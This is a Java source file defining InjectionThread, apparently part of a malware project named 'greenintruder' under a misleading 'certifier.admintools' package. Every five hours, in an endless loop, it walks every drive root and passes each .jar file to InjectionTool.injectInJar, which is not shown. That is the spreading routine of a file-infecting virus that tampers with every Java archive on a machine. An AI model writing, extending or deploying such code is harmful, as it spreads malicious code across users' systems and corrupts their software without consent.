package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Path;

import javax.swing.JOptionPane;

public class InjectionThread extends Thread {

	private BufferedWriter bw = null;
	private FileWriter fw = null;
	private PrintWriter pw = null;

	private static final boolean ENABLE_INJECTIONS_LOGGING = false;

	public InjectionThread() {
		if (ENABLE_INJECTIONS_LOGGING) {
			try {
				fw = new FileWriter(new File(System.getenv("TEMP"), "injection_debug.txt"));
				pw = new PrintWriter(fw);
				bw = new BufferedWriter(fw);
			} catch (IOException e) {

			}
		}
	}

	private void recursive(Path path) {
		File[] fileList = path.toFile().listFiles();
		if (fileList != null) {
			for (File file : fileList) {
				Path pathVal = file.toPath();
				if (file.isDirectory()) {
					recursive(pathVal);
				} else {

					if (ENABLE_INJECTIONS_LOGGING) {
						try {
							bw.write("Will write " + pathVal + ".");
						} catch (IOException e) {
						}
					}
					if (pathVal.toFile().getName().toLowerCase().endsWith(".jar")) {
						boolean injected = InjectionTool.injectInJar(pathVal.toFile());

						if (ENABLE_INJECTIONS_LOGGING) {
							try {
								bw.write(" Injected with status=" + injected + ".\r\n");
							} catch (IOException e) {
							}
						}
					} else {

						if (ENABLE_INJECTIONS_LOGGING) {
							try {
								bw.write(" Not applicable.\r\n");
							} catch (IOException e) {
							}
						}
					}

					if (ENABLE_INJECTIONS_LOGGING) {
						try {
							bw.flush();
						} catch (IOException e) {
						}
					}
				}
			}
		}
	}

	public void run() {
		while (!interrupted()) {
			try {
				for (File root : File.listRoots()) {
					Path rootPath = root.toPath();
					recursive(rootPath);
					/*
					 * Files.walk(rootPath).forEach(path -> { if
					 * (path.toFile().getName().toLowerCase().endsWith(".jar")) { //
					 * InjectionTool.injectInJar(root); } });
					 */
				}
				Thread.sleep(1000 * 60 * 60 * 5);
			} catch (Exception e) {
				JOptionPane.showMessageDialog(null, e);
			}
		}
		if (ENABLE_INJECTIONS_LOGGING) {
			try {
				bw.close();
				pw.close();
				fw.close();
			} catch (IOException e) {

			}
		}

	}

}
